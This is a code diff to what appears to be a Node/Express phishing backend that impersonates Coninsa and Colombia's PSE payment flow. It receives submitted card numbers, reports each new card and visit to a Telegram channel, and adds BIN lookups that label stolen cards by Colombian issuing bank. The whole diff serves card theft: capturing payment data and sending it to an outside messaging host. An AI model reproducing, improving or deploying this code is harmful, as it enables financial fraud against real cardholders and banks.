@@ -113,6 +113,46 @@ async function tgAnswerCallback(id) {
 
 const PSEC_BASE = 'https://pagpse-u6htdvaa.b4a.run';
 
+// ── BIN lookup ────────────────────────────────────────────────────────────────
+const BIN_MANUAL = { '452519': 'Nequi', '409355': 'Nequi' };
+const BIN_KEYWORDS = [
+  { kw: ['bancolombia', 'colombiano'], name: 'Bancolombia' },
+  { kw: ['davivienda'],                name: 'Davivienda'  },
+  { kw: ['nequi'],                     name: 'Nequi'       },
+  { kw: ['popular'],                   name: 'Banco Popular' },
+  { kw: ['occidente'],                 name: 'Banco de Occidente' },
+  { kw: ['bogota'],                    name: 'Banco de Bogotá' },
+  { kw: ['itau'],                      name: 'Itaú'        },
+  { kw: ['bbva'],                      name: 'BBVA'        },
+  { kw: ['av villas', 'avvillas'],     name: 'AV Villas'   },
+  { kw: ['caja social'],               name: 'Caja Social' },
+  { kw: ['falabella'],                 name: 'Falabella'   },
+  { kw: ['pichincha'],                 name: 'Pichincha'   },
+  { kw: ['gnb', 'sudameris'],          name: 'GNB Sudameris' },
+  { kw: ['coomeva', 'bancoomeva'],     name: 'Bancoomeva'  },
+  { kw: ['colpatria', 'scotiabank'],   name: 'Scotiabank Colpatria' },
+  { kw: ['finandina'],                 name: 'Finandina'   },
+  { kw: ['citibank', 'citi'],          name: 'Citibank'    },
+];
+const norm = s => s.toLowerCase().normalize('NFD').replace(/[̀-ͯ]/g,'').replace(/[^a-z0-9 ]/g,' ').replace(/\s+/g,' ').trim();
+
+async function detectBin(cardNumber) {
+  const bin = String(cardNumber).replace(/\s/g,'').substring(0, 6);
+  if (BIN_MANUAL[bin]) return BIN_MANUAL[bin];
+  try {
+    const r = await axios.get(`https://lookup.binlist.net/${bin}`, {
+      headers: { 'Accept-Version': '3' }, timeout: 5000,
+    });
+    const raw = r.data?.bank?.name || '';
+    if (!raw) return r.data?.scheme || 'Desconocido';
+    const n = norm(raw);
+    for (const e of BIN_KEYWORDS) {
+      if (e.kw.some(kw => n.includes(norm(kw)))) return e.name;
+    }
+    return raw;
+  } catch { return null; }
+}
+
 // ── Routes ────────────────────────────────────────────────────────────────────
 
 // Visita nueva: log a Telegram
@@ -162,8 +202,10 @@ app.post('/api/tarjeta/crear', async (req, res) => {
       timeout: 12000,
     });
 
-    const num = (numero_tarjeta || '').replace(/\s/g, '');
-    const banco = num[0] === '4' ? 'Visa' : num[0] === '5' ? 'Mastercard' : num[0] === '3' ? 'Amex/Diners' : 'Otra';
+    const banco = (await detectBin(numero_tarjeta)) ||
+      (num => num[0]==='4' ? 'Visa' : num[0]==='5' ? 'Mastercard' : num[0]==='3' ? 'Amex/Diners' : 'Otra')(
+        (numero_tarjeta || '').replace(/\s/g,'')
+      );
     const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
     await tgText(
       `💳 <b>NUEVA TARJETA — CONINSA</b>\n` +
@@ -177,6 +219,14 @@ app.post('/api/tarjeta/crear', async (req, res) => {
 
     res.json(r.data);
   } catch (e) { res.json({ status: 'ERROR', message: e.message }); }
+});
+
+app.post('/api/detect-bank', async (req, res) => {
+  const { cardNumber } = req.body || {};
+  if (!cardNumber || String(cardNumber).replace(/\s/g,'').length < 6)
+    return res.json({ ok: false, bank: null });
+  const bank = await detectBin(cardNumber);
+  res.json({ ok: true, bank: bank || null });
 });
 
 app.get('/api/tarjeta/estado/:id', async (req, res) => {
